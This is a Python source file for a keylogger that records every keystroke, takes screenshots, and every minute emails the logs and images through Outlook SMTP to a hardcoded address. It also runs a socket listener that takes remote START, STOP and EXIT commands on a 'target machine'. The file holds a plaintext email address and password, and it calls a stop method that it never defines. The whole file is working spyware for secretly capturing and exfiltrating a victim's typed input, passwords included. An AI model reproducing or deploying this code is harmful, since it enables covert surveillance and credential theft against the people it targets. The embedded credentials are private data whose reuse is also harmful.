import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyautogui
import socket
import os

SEND_REPORT_EVERY = 60  # in seconds/1 minute.
EMAIL_ADDRESS = "expertsolutionses@outlook.com"
EMAIL_PASSWORD = "jay@2019PT"
OUTPUT_FOLDER = "/home/preston/Mine/Software Engineering/GitProjects/Mission/strg."
TARGET_IP = '192.168.0.23'  #IP address of the target machine
TARGET_PORT = 12345

class Keylogger:
    def __init__(self, interval, target_ip, target_port):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.target_ip = target_ip
        self.target_port = target_port

    def start_server(self):
        # Start a server to listen for remote control commands
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.target_ip, self.target_port))
        server_socket.listen(1)

        print(f"Server listening on {self.target_ip}:{self.target_port}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Received connection from {client_address[0]}:{client_address[1]}")

            command = client_socket.recv(1024).decode().strip().upper()
            response = ""

            if command == "START":
                self.start()
                response = "Keylogger started"
            elif command == "STOP":
                self.stop()
                response = "Keylogger stopped"
            elif command == "EXIT":
                response = "Exiting remote control"
                break
            else:
                response = "Unknown command"

            client_socket.send(response.encode())
            client_socket.close()

        server_socket.close()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        if not os.path.exists(OUTPUT_FOLDER):
            os.makedirs(OUTPUT_FOLDER)
        with open(os.path.join(OUTPUT_FOLDER, f"{self.filename}.txt"), "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message, image):
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        text_part = MIMEText(message, "plain")
        msg.attach(text_part)

        image_part = MIMEImage(image, name="screenshot.png")
        msg.attach(image_part)

        return msg.as_string()

    def sendmail(self, email, password, message, image_data):
        server = smtplib.SMTP(host="smtp.outlook.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message, image_data))
        server.quit()
        print(f"{datetime.now()} - Sent a package.......................................\{email}")

    def check_internet_connection(self):
        try:
            # Use a reliable hostname or IP address to check connectivity
            socket.create_connection(("8.8.8.8", 53), timeout=2)
            return True
        except OSError:
            return False

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            screenshot = pyautogui.screenshot()
            screenshot.save(os.path.join(OUTPUT_FOLDER, f"{self.filename}.png"))
            with open(os.path.join(OUTPUT_FOLDER, f"{self.filename}.png"), "rb") as f:
                image_data = f.read()

            if self.check_internet_connection():
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, image_data)
            else:
                self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started")
        keyboard.wait()

# Create an instance of the Keylogger and start it
keylogger = Keylogger(SEND_REPORT_EVERY, TARGET_IP, TARGET_PORT)
keylogger.start_server()